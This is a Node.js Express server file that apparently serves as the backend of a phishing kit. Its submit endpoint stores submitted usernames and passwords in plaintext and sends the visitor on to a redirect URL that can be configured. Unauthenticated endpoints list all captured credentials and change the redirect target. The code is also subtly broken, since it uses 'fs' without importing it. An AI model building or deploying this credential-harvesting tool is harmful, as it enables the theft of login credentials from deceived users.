const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
app.get('/admin.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// API Endpoints
app.post('/api/submit', (req, res) => {
  const { username, password } = req.body;
  if (username && password) {
    const submissions = JSON.parse(fs.readFileSync('submissions.json'));
    submissions.push({ username, password, timestamp: new Date().toISOString() });
    fs.writeFileSync('submissions.json', JSON.stringify(submissions));
    const config = JSON.parse(fs.readFileSync('config.json'));
    res.json({ message: 'Submission successful', redirectUrl: config.redirectUrl });
  } else {
    res.status(400).json({ message: 'Invalid input' });
  }
});

app.get('/api/submissions', (req, res) => {
  const submissions = JSON.parse(fs.readFileSync('submissions.json'));
  res.json(submissions);
});

app.post('/api/config/redirect', (req, res) => {
  const { redirectUrl } = req.body;
  if (redirectUrl) {
    const config = { redirectUrl };
    fs.writeFileSync('config.json', JSON.stringify(config));
    res.json({ message: 'Redirect URL updated successfully' });
  } else {
    res.status(400).json({ message: 'Invalid URL' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});